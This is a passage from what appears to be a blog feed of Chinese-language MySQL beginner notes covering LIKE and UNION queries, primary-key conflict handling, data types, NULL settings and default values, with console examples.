<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from stu where stuname like &#x27;T_m&#x27;;</span><br><span class="line">+--------+---------+--------+--------+---------+------------+------+------+</span><br><span class="line">| stuNo  | stuName | stuSex | stuAge | stuSeat | stuAddress | ch   | math |</span><br><span class="line">+--------+---------+--------+--------+---------+------------+------+------+</span><br><span class="line">| s25320 | Tom     | 男       |     24 |       8 | 北京           |   65 |   67 |</span><br><span class="line">+--------+---------+--------+--------+---------+------------+------+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">-- 查询姓张的学生</span><br><span class="line">mysql&gt; select * from stu where stuname like &#x27;张%&#x27;;</span><br><span class="line">+--------+---------+--------+--------+---------+------------+------+------+</span><br><span class="line">| stuNo  | stuName | stuSex | stuAge | stuSeat | stuAddress | ch   | math |</span><br><span class="line">+--------+---------+--------+--------+---------+------------+------+------+</span><br><span class="line">| s25301 | 张秋丽   | 男     |     18 |       1 | 北京        |   80 | NULL |</span><br><span class="line">+--------+---------+--------+--------+---------+------------+------+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>



<h2 id="1-8-union（联合）"><a href="#1-8-union（联合）" class="headerlink" title="1.8  union（联合）"></a>1.8  union（联合）</h2><p>插入测试数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table emp(</span><br><span class="line">       id tinyint unsigned auto_increment primary key,</span><br><span class="line">       name varchar(20) not null,</span><br><span class="line">       skill set(&#x27;PHP&#x27;,&#x27;mysql&#x27;,&#x27;java&#x27;)</span><br><span class="line"> );</span><br><span class="line"> </span><br><span class="line">insert into emp values (null,&#x27;李白&#x27;,1),(null,&#x27;杜甫&#x27;,2),(null,&#x27;白居易&#x27;,4)</span><br><span class="line">insert into emp values (null,&#x27;争青小子&#x27;,3)</span><br></pre></td></tr></table></figure>

<h4 id="1-8-1-union的使用"><a href="#1-8-1-union的使用" class="headerlink" title="1.8.1 union的使用"></a>1.8.1 union的使用</h4><p>作用：将多个select语句结果集纵向联合起来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">语法：select 语句 union [选项] select 语句 union [选项] select 语句</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 查询stu表中的姓名和emp表中姓名 结果自动合并的重复的记录</span><br><span class="line">mysql&gt; select stuname from stu union select name from emp;</span><br></pre></td></tr></table></figure>

<p>例题：查询上海的男生和北京的女生</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 方法一：</span><br><span class="line">mysql&gt; select * from stu where (stuaddress=&#x27;上海&#x27; and stusex=&#x27;男&#x27;) or (stuaddress=&#x27;北京&#x27; and stusex=&#x27;女&#x27;);</span><br><span class="line">+--------+---------+--------+--------+---------+------------+------+------+</span><br><span class="line">| stuNo  | stuName | stuSex | stuAge | stuSeat | stuAddress | ch   | math |</span><br><span class="line">+--------+---------+--------+--------+---------+------------+------+------+</span><br><span class="line">| s25302 | 李文才       | 男       |     31 |       3 | 上海          |   77 |   76 |</span><br><span class="line">| s25303 | 李斯文       | 女      |     22 |       2 | 北京           |   55 |   82 |</span><br><span class="line">+--------+---------+--------+--------+---------+------------+------+------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">-- 方法二：union</span><br><span class="line">mysql&gt; select * from stu where stuaddress=&#x27;上海&#x27; and stusex=&#x27;男&#x27; union select * from stu where stuaddress=&#x27;北京&#x27; and stusex=&#x27;女&#x27;;</span><br><span class="line">+--------+---------+--------+--------+---------+------------+------+------+</span><br><span class="line">| stuNo  | stuName | stuSex | stuAge | stuSeat | stuAddress | ch   | math |</span><br><span class="line">+--------+---------+--------+--------+---------+------------+------+------+</span><br><span class="line">| s25302 | 李文才       | 男       |     31 |       3 | 上海          |   77 |   76 |</span><br><span class="line">| s25303 | 李斯文       | 女      |     22 |       2 | 北京           |   55 |   82 |</span><br><span class="line">+--------+---------+--------+--------+---------+------------+------+------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">结论：union可以将一个复杂的条件转成两个简单的条件</span><br></pre></td></tr></table></figure>



<h4 id="1-8-2-union的选项"><a href="#1-8-2-union的选项" class="headerlink" title="1.8.2   union的选项"></a>1.8.2   union的选项</h4><p>union的选项有两个</p>
<p>1、     all：显示所有数据</p>
<p>2、     distinct：去除重复的数据【默认】</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select stuname from stu union all select name from emp;</span><br></pre></td></tr></table></figure>



<h4 id="1-8-3-union的注意事项"><a href="#1-8-3-union的注意事项" class="headerlink" title="1.8.3   union的注意事项"></a>1.8.3   union的注意事项</h4><p>1、     union两边的select语句的字段个数必须一致 </p>
<p>2、     union两边的select语句的字段名可以不一致，最终按第一个select语句的字段名。</p>
<p> 3、     union两边的select语句中的数据类型可以不一致。</p>
<h2 id="1-9-补充"><a href="#1-9-补充" class="headerlink" title="1.9 补充"></a>1.9 补充</h2><h4 id="1-9-1-插入数据时主键冲突"><a href="#1-9-1-插入数据时主键冲突" class="headerlink" title="1.9.1  插入数据时主键冲突"></a>1.9.1  插入数据时主键冲突</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 插入测试表</span><br><span class="line">mysql&gt; create table stu(</span><br><span class="line">    -&gt; id char(4) primary key,</span><br><span class="line">    -&gt; name varchar(20)</span><br><span class="line">    -&gt; )engine=innodb;</span><br><span class="line">Query OK, 0 rows affected (0.06 sec)</span><br><span class="line"></span><br><span class="line">-- 插入测试数据</span><br><span class="line">mysql&gt; insert into stu values (&#x27;s001&#x27;,&#x27;tom&#x27;);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>如果插入的主键重复会报错</p>
<p>解决方法：如果插入的主键重复就执行替换</p>
<p>语法一：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; replace into stu values(&#x27;s002&#x27;,&#x27;ketty&#x27;);</span><br><span class="line">Query OK, 2 rows affected (0.00 sec)</span><br><span class="line"># 原理：如果插入的主键不重复就直接插入，如果主键重复就替换（删除原来的记录，插入新记录）</span><br></pre></td></tr></table></figure>

<p>语法二（推荐）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">on duplicate key update # 当插入的值与主键或唯一键有冲突执行update操作</span><br><span class="line">-- 例题</span><br><span class="line">mysql&gt; insert into stu values (&#x27;s002&#x27;,&#x27;李白&#x27;) on duplicate key update name=&#x27;李白&#x27;;</span><br><span class="line">Query OK, 2 rows affected (0.00 sec)</span><br><span class="line"># 插入的数据和主键或唯一键起冲突，将s002的name字段改为‘李白’</span><br></pre></td></tr></table></figure>





]]></content>
  </entry>
  <entry>
    <title>MYSQL数据库基础2</title>
    <url>/2023/04/23/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%802/</url>
    <content><![CDATA[<h2 id="1-2-数据类型"><a href="#1-2-数据类型" class="headerlink" title="1.2  数据类型"></a>1.2  数据类型</h2><p>MySQL中的数据类型是强类型</p>
<h4 id="1-2-1-数值型"><a href="#1-2-1-数值型" class="headerlink" title="1.2.1  数值型"></a>1.2.1  数值型</h4><p><strong>1、  整型</strong></p>
<table>
<thead>
<tr>
<th>整形</th>
<th>占用字节数</th>
<th>范围</th>
</tr>
</thead>
<tbody><tr>
<td>tinyint</td>
<td>1</td>
<td>-128~127</td>
</tr>
<tr>
<td>smallint</td>
<td>2</td>
<td>-32768~32767</td>
</tr>
<tr>
<td>mediumint</td>
<td>3</td>
<td>-8388608~8388607</td>
</tr>
<tr>
<td>int</td>
<td>4</td>
<td>-2147483648~2147483647</td>
</tr>
<tr>
<td>bigint</td>
<td>8</td>
<td>-9223372036854775808~9223372036854775807</td>
</tr>
</tbody></table>
<p>选择的范围尽可能小，范围越小占用资源越少</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; create table stu1(</span><br><span class="line">    -&gt; id tinyint,      # 范围要尽可能小，范围越小，占用空间越少</span><br><span class="line">    -&gt; name varchar(20)</span><br><span class="line">    -&gt; );</span><br><span class="line">Query OK, 0 rows affected (0.02 sec)</span><br><span class="line"></span><br><span class="line">-- 超出范围会报错</span><br><span class="line">mysql&gt; insert into stu1 values (128,&#x27;tom&#x27;);</span><br><span class="line">ERROR 1264 (22003): Out of range value for column &#x27;id&#x27; at row 1</span><br></pre></td></tr></table></figure>



<p>无符号整形（unsigned） 无符号整形就是没有负数，无符号整数是整数的两倍</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; create table stu2(</span><br><span class="line">    -&gt; id tinyint unsigned    # 无符号整数</span><br><span class="line">    -&gt; );</span><br><span class="line">Query OK, 0 rows affected (0.02 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into stu2 values (128);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br></pre></td></tr></table></figure>



<p>整形支持显示宽度，显示宽带是最小的显示位数，如int(11)表示整形最少用11位表示，如果不够位数用0填充。显示宽度默认不起作用，必须结合zerofill才起作用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; create table stu4(</span><br><span class="line">    -&gt; id int(5),</span><br><span class="line">    -&gt; num int(5) zerofill   # 添加前导0,int(5)显示宽带是5</span><br><span class="line">    -&gt; );</span><br><span class="line">Query OK, 0 rows affected (0.05 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into stu4 values (12,12);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from stu4;</span><br><span class="line">+------+-------+</span><br><span class="line">| id   | num   |</span><br><span class="line">+------+-------+</span><br><span class="line">|   12 | 00012 |</span><br><span class="line">+------+-------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>小结：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、范围要尽可能小，范围越小，占用空间越少</span><br><span class="line">2、无符号整数是整数的两倍</span><br><span class="line">3、整形支持显示宽度，显示宽带是最小的显示位数，必须结合zerofill才起作用</span><br></pre></td></tr></table></figure>



<p><strong>2、浮点型</strong></p>
<table>
<thead>
<tr>
<th>浮点型</th>
<th>占用字节数</th>
<th>范围</th>
</tr>
</thead>
<tbody><tr>
<td>float（单精度型）</td>
<td>4</td>
<td>-3.4E+38~3.4E+38</td>
</tr>
<tr>
<td>double（双精度型）</td>
<td>8</td>
<td>-1.8E+308~1.8E+308</td>
</tr>
</tbody></table>
<p>浮点型的声明：float(M,D)   double(M,D)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">M：总位数   D：小数位数</span><br></pre></td></tr></table></figure>

<p>例题</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; create table stu5(</span><br><span class="line">    -&gt; num1 float(5,2),   -- 浮点数</span><br><span class="line">    -&gt; num2 double(6,1)	  -- 双精度数</span><br><span class="line">    -&gt; );</span><br><span class="line">Query OK, 0 rows affected (0.05 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into stu5 values (3.1415,12.96);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from stu5;</span><br><span class="line">+------+------+</span><br><span class="line">| num1 | num2 |</span><br><span class="line">+------+------+</span><br><span class="line">| 3.14 | 13.0 |</span><br><span class="line">+------+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>



<p>MySQL浮点数支持科学计数法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; create table stu6(</span><br><span class="line">    -&gt; num float   # 不指定位数，默认是小数点后面6位  double默认是17位</span><br><span class="line">    -&gt; );</span><br><span class="line">Query OK, 0 rows affected (0.03 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into stu6 values (5E2),(6E-2); # 插入科学计数法</span><br><span class="line">Query OK, 2 rows affected (0.00 sec)</span><br><span class="line">Records: 2  Duplicates: 0  Warnings: 0</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from stu6;</span><br><span class="line">+------+</span><br><span class="line">| num  |</span><br><span class="line">+------+</span><br><span class="line">|  500 |</span><br><span class="line">| 0.06 |</span><br><span class="line">+------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>



<p>浮点数精度会丢失</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; insert into stu6 values(99.999999999);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from stu6;</span><br><span class="line">+------+</span><br><span class="line">| num  |</span><br><span class="line">+------+</span><br><span class="line">|  100 |</span><br><span class="line">+------+</span><br></pre></td></tr></table></figure>

<p>小结：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、浮点数有单精度和双精度</span><br><span class="line">2、浮点数支持科学计数法</span><br><span class="line">3、浮点数精度会丢失</span><br></pre></td></tr></table></figure>



<p>3、小数（定点数）</p>
<p>原理：将整数部分和小数部分分开存储</p>
<p>语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">decimal(M,D)</span><br></pre></td></tr></table></figure>

<p>例题：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; create table stu8(</span><br><span class="line">    -&gt; num decimal(20,9)   # 存放定点数</span><br><span class="line">    -&gt; );</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into stu8 values(12.999999999);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from stu8;</span><br><span class="line">+--------------+</span><br><span class="line">| num          |</span><br><span class="line">+--------------+</span><br><span class="line">| 12.999999999 |</span><br><span class="line">+--------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>小结：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、decimal是变长的，大致是每9个数字用4个字节存储，整数和小数分开计算。M最大是65,D最大是30，默认是（10,2）。</span><br><span class="line">2、定点和浮点都支持无符号、显示宽度0填充。</span><br></pre></td></tr></table></figure>



<h4 id="1-2-2-字符型"><a href="#1-2-2-字符型" class="headerlink" title="1.2.2  字符型"></a>1.2.2  字符型</h4><p>在数据库中没有字符串概念，只有字符，所以数据库中只能用单引号</p>
<table>
<thead>
<tr>
<th>数据类型</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>char</td>
<td>定长字符，最大可以到255</td>
</tr>
<tr>
<td>varchar</td>
<td>可变长度字符，最大可以到65535</td>
</tr>
<tr>
<td>tinytext</td>
<td>2^8^–1 &#x3D;255</td>
</tr>
<tr>
<td>text</td>
<td>2^16^–1 &#x3D;65535</td>
</tr>
<tr>
<td>mediumtext</td>
<td>2^24^–1</td>
</tr>
<tr>
<td>longtext</td>
<td>2^32^–1</td>
</tr>
</tbody></table>
<p>char(4)：存放4个字符，中英文一样。</p>
<p>varchar(L)实现变长机制，需要额外的空间来记录数据真实的长度。</p>
<p>L的理论长度是65535，但事实上达不到，因为有的字符是多字节字符，所以L达不到65535。</p>
<p>text系列的类型在表中存储的是地址，占用大小大约10个字节</p>
<p>一个记录的所有字段的总长度也不能超过65535个字节。</p>
<p>小结：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、char是定长，var是变长</span><br><span class="line">2、char最大值是255，varchar最大值是65535，具体要看字符编码</span><br><span class="line">3、text系列在表中存储的是地址</span><br><span class="line">4、一条记录的总长度不能超过65535</span><br></pre></td></tr></table></figure>



<h4 id="1-2-3-枚举-enum"><a href="#1-2-3-枚举-enum" class="headerlink" title="1.2.3  枚举(enum)"></a>1.2.3  枚举(enum)</h4><p>从集合中选择一个值作为数据（单选）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; create table stu12(</span><br><span class="line">    -&gt; name varchar(20),</span><br><span class="line">    -&gt; sex enum(&#x27;男&#x27;,&#x27;女&#x27;,&#x27;保密&#x27;) # 枚举</span><br><span class="line">    -&gt; );</span><br><span class="line">Query OK, 0 rows affected (0.06 sec)</span><br><span class="line"></span><br><span class="line">-- 插入的枚举值只能是枚举中提供的选项</span><br><span class="line">mysql&gt; insert into stu12 values (&#x27;tom&#x27;,&#x27;男&#x27;);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line">-- 报错，只能插入男、女、保密</span><br><span class="line">mysql&gt; insert into stu12 values (&#x27;tom&#x27;,&#x27;不告诉你&#x27;);</span><br><span class="line">ERROR 1265 (01000): Data truncated for column &#x27;sex&#x27; at row 1</span><br></pre></td></tr></table></figure>

<p>枚举值是通过整形数字来管理的，第一个值是1，第二个值是2，以此类推，枚举值在数据库存储的是整形数字。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; insert into stu12 values (&#x27;berry&#x27;,2);   -- 插入数字</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from stu12;</span><br><span class="line">+-------+------+</span><br><span class="line">| name  | sex  |</span><br><span class="line">+-------+------+</span><br><span class="line">| tom   | 男     |</span><br><span class="line">| berry | 女    |</span><br><span class="line">+-------+------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from stu12 where sex=2;   -- 2表示第二个枚举值</span><br><span class="line">+-------+------+</span><br><span class="line">| name  | sex  |</span><br><span class="line">+-------+------+</span><br><span class="line">| berry | 女    |</span><br><span class="line">+-------+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>枚举优点：</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">（1）、限制值</span><br><span class="line">（2）、节省空间</span><br><span class="line">（3）、运行速度快（整形比字符串运行速度快）</span><br></pre></td></tr></table></figure>

<p>思考：已知枚举占用两个字节，所以最多可以有多少个枚举值？</p>
<p>答：2字节&#x3D;16位，2^16^&#x3D;65536，范围是（0-65535），由于枚举从1开始，所以枚举值最多有65535个</p>
<h4 id="1-2-4-集合-set"><a href="#1-2-4-集合-set" class="headerlink" title="1.2.4  集合(set)"></a>1.2.4  集合(set)</h4><p>从集合中选择一些值作为数据（多选）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; create table stu13(</span><br><span class="line">    -&gt; name varchar(20),</span><br><span class="line">    -&gt; hobby set(&#x27;爬山&#x27;,&#x27;读书&#x27;,&#x27;游泳&#x27;,&#x27;烫头&#x27;)  -- 集合</span><br><span class="line">    -&gt; );</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into stu13 values (&#x27;tom&#x27;,&#x27;爬山&#x27;);</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into stu13 values (&#x27;Berry&#x27;,&#x27;爬山,游泳&#x27;);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into stu13 values (&#x27;Berry&#x27;,&#x27;游泳,爬山&#x27;);   -- 插入的顺序不一样，但显示的顺序一样</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from stu13;</span><br><span class="line">+-------+-----------+</span><br><span class="line">| name  | hobby     |</span><br><span class="line">+-------+-----------+</span><br><span class="line">| tom   | 爬山         |</span><br><span class="line">| Berry | 爬山,游泳       |</span><br><span class="line">| Berry | 爬山,游泳       |</span><br><span class="line">+-------+-----------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>



<p>集合和枚举一样，也为每个集合元素分配一个固定值，分配方式是从前往后按2的0、1、2、…次方，转换成二进制后只有一位是1，其他都是0。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;爬山&#x27;,&#x27;读书&#x27;,&#x27;游泳&#x27;,&#x27;烫头&#x27;</span><br><span class="line">  1		2		4	8</span><br><span class="line">  </span><br><span class="line">mysql&gt; select hobby+0 from stu13;</span><br><span class="line">+---------+</span><br><span class="line">| hobby+0 |</span><br><span class="line">+---------+</span><br><span class="line">|       1 |</span><br><span class="line">|       5 |</span><br><span class="line">|       5 |</span><br><span class="line">+---------+</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into stu13 values (&#x27;rose&#x27;,15);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br></pre></td></tr></table></figure>



<p>已知集合类型占8个字节，那么集合中最多有多少选项</p>
<p>答：有64个选项。</p>
<h4 id="1-2-5-日期时间型"><a href="#1-2-5-日期时间型" class="headerlink" title="1.2.5  日期时间型"></a>1.2.5  日期时间型</h4><table>
<thead>
<tr>
<th>数据类型</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>datetime</td>
<td>日期时间，占用8个字节</td>
</tr>
<tr>
<td>date</td>
<td>日期  占用3个字节</td>
</tr>
<tr>
<td>time</td>
<td>时间 占用3个字节</td>
</tr>
<tr>
<td>year</td>
<td>年份，占用1个字节</td>
</tr>
<tr>
<td>timestamp</td>
<td>时间戳，占用4个字节</td>
</tr>
</tbody></table>
<p>1、datetime和date</p>
<p>datetime格式：年-月-日  小时:分钟:秒。支持的范围是’1000-01-01 00:00:00’到’9999-12-31<br>23:59:59’。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; create table stu14(</span><br><span class="line">    -&gt; t1 datetime,    -- 日期时间</span><br><span class="line">    -&gt; t2 date				-- 日期</span><br><span class="line">    -&gt; );</span><br><span class="line">Query OK, 0 rows affected (0.05 sec)</span><br><span class="line">-- 插入测试数据</span><br><span class="line">mysql&gt; insert into stu14 values (&#x27;2019-01-15 12:12:12&#x27;,&#x27;2019-01-15 12:12:12&#x27;);</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.00 sec)</span><br><span class="line">-- 查询</span><br><span class="line">mysql&gt; select * from stu14;</span><br><span class="line">+---------------------+------------+</span><br><span class="line">| t1                  | t2         |</span><br><span class="line">+---------------------+------------+</span><br><span class="line">| 2019-01-15 12:12:12 | 2019-01-15 |</span><br><span class="line">+---------------------+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>



<p>2、timestamp（时间戳）</p>
<p>datetime类型和timestamp类型表现上是一样的，他们的区别在于：</p>
<p>datetime从1000到9999，而timestamp从1970年~2038年（原因在于timestamp占用4个字节，和整形的范围一样，2038年01月19日11:14:07以后的秒数就超过了4个字节的长度）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; create table stu15(</span><br><span class="line">    -&gt; t1 timestamp</span><br><span class="line">    -&gt; );</span><br><span class="line">Query OK, 0 rows affected (0.06 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into stu15 values (&#x27;2038-01-19 11:14:07&#x27;);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br></pre></td></tr></table></figure>



<p>3、year</p>
<p>只能表示1901~2155之间的年份，因为只占用1个字节，只能表示255个数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; create table stu16(</span><br><span class="line">    -&gt; y1 year</span><br><span class="line">    -&gt; );</span><br><span class="line">Query OK, 0 rows affected (0.08 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into stu16 values (2155);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br></pre></td></tr></table></figure>



<p>4、time</p>
<p>可以表示时间，也可以表示时间间隔。范围是：-838:59:59~838:59:59</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; create table stu17(</span><br><span class="line">    -&gt; t1 time</span><br><span class="line">    -&gt; );</span><br><span class="line">Query OK, 0 rows affected (0.02 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into stu17 values (&#x27;12:12:12&#x27;);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into stu17 values (&#x27;212:12:12&#x27;);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into stu17 values (&#x27;-212:12:12&#x27;);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into stu17 values (&#x27;839:00:00&#x27;);   -- 报错</span><br><span class="line">ERROR 1292 (22007): Incorrect time value: &#x27;839:00:00&#x27; for column &#x27;t1&#x27; at row 1</span><br><span class="line"></span><br><span class="line">-- time支持以天的方式来表示时间间隔</span><br><span class="line">mysql&gt; insert into stu17 values (&#x27;10 10:25:25&#x27;);   -- 10天10小时25分25秒</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from stu17;</span><br><span class="line">+------------+</span><br><span class="line">| t1         |</span><br><span class="line">+------------+</span><br><span class="line">| 12:12:12   |</span><br><span class="line">| 212:12:12  |</span><br><span class="line">| -212:12:12 |</span><br><span class="line">| 250:25:25  |</span><br><span class="line">+------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>



<h4 id="1-2-6-Boolean"><a href="#1-2-6-Boolean" class="headerlink" title="1.2.6  Boolean"></a>1.2.6  Boolean</h4><p>MySQL不支持布尔型，true和false在数据库中对应的是1和0</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; create table stu18(</span><br><span class="line">    -&gt; flag boolean</span><br><span class="line">    -&gt; );</span><br><span class="line">Query OK, 0 rows affected (0.05 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; desc stu18;</span><br><span class="line">+-------+------------+------+-----+---------+-------+</span><br><span class="line">| Field | Type       | Null | Key | Default | Extra |</span><br><span class="line">+-------+------------+------+-----+---------+-------+</span><br><span class="line">| flag  | tinyint(1) | YES  |     | NULL    |       |</span><br><span class="line">+-------+------------+------+-----+---------+-------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into stu18 values (true),(false);</span><br><span class="line">Query OK, 2 rows affected (0.00 sec)</span><br><span class="line">Records: 2  Duplicates: 0  Warnings: 0</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from stu18;</span><br><span class="line">+------+</span><br><span class="line">| flag |</span><br><span class="line">+------+</span><br><span class="line">|    1 |</span><br><span class="line">|    0 |</span><br><span class="line">+------+</span><br><span class="line">2 rows in set (0.00 sec</span><br></pre></td></tr></table></figure>

<p>小结：</p>
<p>boolean型在MySQL中对应的是tinyint。</p>
<h4 id="1-2-6-练习题"><a href="#1-2-6-练习题" class="headerlink" title="1.2.6  练习题"></a>1.2.6  练习题</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">电话号码一般使用什么数据类型存储?			 varchar</span><br><span class="line">手机号码用什么数据类型						char</span><br><span class="line">性别一般使用什么数据类型存储?				  char  tinyint  enum</span><br><span class="line">年龄信息一般使用什么数据类型存储?			 tinyint</span><br><span class="line">照片信息一般使用什么数据类型存储?		 	 binary</span><br><span class="line">薪水一般使用什么数据类型存储?			      decimal</span><br></pre></td></tr></table></figure>

<p><code>BINARY</code>是MySQL中一种字符类型，用于存储固定长度的二进制数据，如二进制文件、加密密钥等。</p>
<h2 id="1-3-列属性"><a href="#1-3-列属性" class="headerlink" title="1.3  列属性"></a>1.3  列属性</h2><h4 id="1-3-1-是否为空（null-not-null）"><a href="#1-3-1-是否为空（null-not-null）" class="headerlink" title="1.3.1  是否为空（null|not null）"></a>1.3.1  是否为空（null|not null）</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">null表示字段值可以为null</span><br><span class="line">not null字段值不能为空</span><br></pre></td></tr></table></figure>

<p>练习</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">学员姓名允许为空吗?					not null</span><br><span class="line">家庭地址允许为空吗?					not null</span><br><span class="line">电子邮件信息允许为空吗?			   null</span><br><span class="line">考试成绩允许为空吗?					null</span><br></pre></td></tr></table></figure>



<h4 id="1-3-2-默认值（default）"><a href="#1-3-2-默认值（default）" class="headerlink" title="1.3.2  默认值（default）"></a>1.3.2  默认值（default）</h4><p>如果一个字段没有插入值，可以默认插入一个指定的值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; create table stu19(</span><br><span class="line">    -&gt; name varchar(20) not null default &#x27;姓名不详&#x27;,</span><br><span class="line">    -&gt; addr varchar(50) not null default &#x27;地址不详&#x27;</span><br><span class="line">    -&gt; );</span><br><span class="line">Query OK, 0 rows affected (0.05 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into stu19(name) values (&#x27;tom&#x27;);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into stu19 values (default,default);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from stu19;</span><br><span class="line">+----------+----------+</span><br><span class="line">| name     | addr     |</span><br><span class="line">+----------+----------+</span><br><span class="line">| tom      | 地址不详        |</span><br><span class="line">| 姓名不详         | 地址不详        |</span><br><span class="line">+----------+----------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>小结：</p>
<p>default关键字用来插入默认值</p>
